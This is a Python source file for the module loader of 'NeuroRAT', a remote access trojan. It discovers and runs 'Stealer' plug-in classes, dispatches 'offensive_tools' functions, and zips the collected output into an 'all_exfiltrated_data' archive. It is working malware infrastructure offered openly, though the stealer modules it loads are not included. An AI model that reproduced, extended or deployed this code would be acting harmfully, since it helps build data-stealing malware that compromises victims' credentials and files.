#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Module Loader for NeuroRAT
Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
License: MIT

This module handles loading, running and managing data exfiltration modules
"""

import os
import sys
import json
import time
import logging
import zipfile
import tempfile
import importlib
import traceback
from typing import Dict, List, Optional, Any, Callable, Union
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ModuleLoader")

class ModuleLoader:
    """
    Module loader and manager for NeuroRAT's data exfiltration modules
    """
    
    def __init__(self, base_dir: str = None, output_dir: str = None, verbose: bool = False):
        """
        Initialize the module loader
        
        Args:
            base_dir: Directory containing the modules
            output_dir: Directory to store exfiltrated data
            verbose: Whether to output verbose logs
        """
        self.base_dir = base_dir or os.path.dirname(os.path.abspath(__file__))
        self.output_dir = output_dir or os.path.join(os.getcwd(), "extracted_data")
        self.verbose = verbose
        
        # Create output directory if it doesn't exist
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Dictionary to store loaded modules
        self.modules = {}
        
        # Results storage
        self.results = {}
        
        if self.verbose:
            logger.setLevel(logging.DEBUG)
        
        logger.debug(f"ModuleLoader initialized with base_dir: {self.base_dir}, output_dir: {self.output_dir}")
    
    def discover_modules(self) -> List[str]:
        """
        Discover available modules in the base directory
        
        Returns:
            List of module names (without .py extension)
        """
        module_files = []
        
        try:
            for file in os.listdir(self.base_dir):
                if file.endswith(".py") and not file.startswith("_") and file != "module_loader.py":
                    module_name = file[:-3]  # Remove .py extension
                    module_files.append(module_name)
                    logger.debug(f"Discovered module: {module_name}")
        except Exception as e:
            logger.error(f"Error discovering modules: {e}")
        
        return module_files
    
    def load_module(self, module_name: str) -> bool:
        """
        Load a module by name
        
        Args:
            module_name: Name of the module to load (without .py extension)
            
        Returns:
            True if module was loaded successfully, False otherwise
        """
        try:
            # Calculate the full import path
            if self.base_dir not in sys.path:
                sys.path.insert(0, self.base_dir)
            
            # Check if the module's file exists
            module_path = os.path.join(self.base_dir, f"{module_name}.py")
            if not os.path.exists(module_path):
                logger.error(f"Module file not found: {module_path}")
                return False
            
            # Import the module
            module = importlib.import_module(module_name)
            
            # Reload the module if it's already loaded to get the latest version
            if module_name in self.modules:
                module = importlib.reload(module)
            
            # Store the module
            self.modules[module_name] = module
            logger.info(f"Successfully loaded module: {module_name}")
            return True
        except Exception as e:
            logger.error(f"Error loading module {module_name}: {e}")
            traceback.print_exc()
            return False
    
    def load_all_modules(self) -> Dict[str, bool]:
        """
        Load all available modules
        
        Returns:
            Dictionary mapping module names to loading success status
        """
        results = {}
        module_names = self.discover_modules()
        
        for module_name in module_names:
            results[module_name] = self.load_module(module_name)
        
        return results
    
    def run_module(self, module_name: str, **kwargs) -> Dict:
        """
        Run a loaded module or special offensive tool
        
        Args:
            module_name: Name of the module to run
            **kwargs: Additional arguments to pass to the module's run method
            
        Returns:
            Results from the module's execution
        """
        # --- OFFENSIVE TOOLS INTEGRATION ---
        if module_name.startswith("offensive_tools."):
            try:
                from agent_modules import offensive_tools
                tool_func = getattr(offensive_tools, module_name.split(".", 1)[1])
                return tool_func(**kwargs)
            except Exception as e:
                return {"status": "error", "message": f"Failed to run offensive tool: {e}"}
        # --- END OFFENSIVE TOOLS ---
        
        if module_name not in self.modules:
            success = self.load_module(module_name)
            if not success:
                return {"status": "error", "message": f"Failed to load module: {module_name}"}
        
        module = self.modules[module_name]
        
        try:
            # Determine the main class in the module
            main_class = None
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if isinstance(attr, type) and attr.__module__ == module.__name__ and "Stealer" in attr_name:
                    main_class = attr
                    break
            
            if not main_class:
                return {"status": "error", "message": f"No stealer class found in module: {module_name}"}
            
            # Set the output directory for this module
            module_output_dir = os.path.join(self.output_dir, module_name)
            os.makedirs(module_output_dir, exist_ok=True)
            
            # Create an instance and run it
            instance = main_class(output_dir=module_output_dir)
            start_time = time.time()
            result = instance.run()
            end_time = time.time()
            
            # Add execution metadata
            result["execution_time"] = end_time - start_time
            result["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Store the result
            self.results[module_name] = result
            
            logger.info(f"Successfully ran module: {module_name}")
            return result
        except Exception as e:
            error_msg = f"Error running module {module_name}: {e}"
            logger.error(error_msg)
            traceback.print_exc()
            return {"status": "error", "message": error_msg, "exception": str(e)}
    
    def run_all_modules(self, exclude: List[str] = None) -> Dict[str, Dict]:
        """
        Run all loaded modules
        
        Args:
            exclude: List of module names to exclude from execution
            
        Returns:
            Dictionary mapping module names to execution results
        """
        results = {}
        exclude = exclude or []
        
        # Ensure all modules are loaded
        self.load_all_modules()
        
        for module_name in self.modules:
            if module_name not in exclude:
                results[module_name] = self.run_module(module_name)
        
        return results
    
    def get_results(self) -> Dict[str, Dict]:
        """
        Get the results of all executed modules
        
        Returns:
            Dictionary mapping module names to execution results
        """
        return self.results
    
    def get_result(self, module_name: str) -> Optional[Dict]:
        """
        Get the results of a specific module
        
        Args:
            module_name: Name of the module
            
        Returns:
            Results of the module's execution, or None if not available
        """
        return self.results.get(module_name)
    
    def pack_all_results(self) -> str:
        """
        Pack all results into a single ZIP file
        
        Returns:
            Path to the created ZIP file
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_path = os.path.join(self.output_dir, f"all_exfiltrated_data_{timestamp}.zip")
        
        # Write the combined results JSON
        summary_file = os.path.join(self.output_dir, f"summary_{timestamp}.json")
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2)
        
        # Create ZIP file
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Add summary file
            zipf.write(summary_file, os.path.basename(summary_file))
            
            # Add all module output directories
            for module_name in self.results:
                module_dir = os.path.join(self.output_dir, module_name)
                if os.path.exists(module_dir) and os.path.isdir(module_dir):
                    for root, _, files in os.walk(module_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.join(module_name, os.path.relpath(file_path, module_dir))
                            zipf.write(file_path, arcname)
        
        logger.info(f"Packed all results to: {zip_path}")
        return zip_path


def main():
    """Main function to demonstrate the module loader"""
    import argparse
    
    parser = argparse.ArgumentParser(description="NeuroRAT Module Loader")
    parser.add_argument("--output-dir", type=str, help="Directory to store exfiltrated data")
    parser.add_argument("--module", type=str, help="Specific module to run")
    parser.add_argument("--all", action="store_true", help="Run all available modules")
    parser.add_argument("--exclude", type=str, help="Comma-separated list of modules to exclude")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    
    args = parser.parse_args()
    
    # Create module loader
    loader = ModuleLoader(output_dir=args.output_dir, verbose=args.verbose)
    
    if args.module:
        # Run a specific module
        result = loader.run_module(args.module)
        print(f"\nModule {args.module} result:")
        if "summary" in result:
            for key, value in result["summary"].items():
                print(f"  {key}: {value}")
        else:
            print(f"  Status: {result.get('status', 'unknown')}")
    elif args.all:
        # Run all modules
        exclude = []
        if args.exclude:
            exclude = [m.strip() for m in args.exclude.split(",")]
        
        results = loader.run_all_modules(exclude=exclude)
        
        print("\nAll modules results:")
        for module_name, result in results.items():
            print(f"\n{module_name}:")
            if "summary" in result:
                for key, value in result["summary"].items():
                    print(f"  {key}: {value}")
            else:
                print(f"  Status: {result.get('status', 'unknown')}")
        
        # Pack all results
        zip_path = loader.pack_all_results()
        print(f"\nAll results packed to: {zip_path}")
    else:
        # Just list available modules
        modules = loader.discover_modules()
        print("\nAvailable modules:")
        for module in modules:
            print(f"  {module}")


if __name__ == "__main__":
    main() 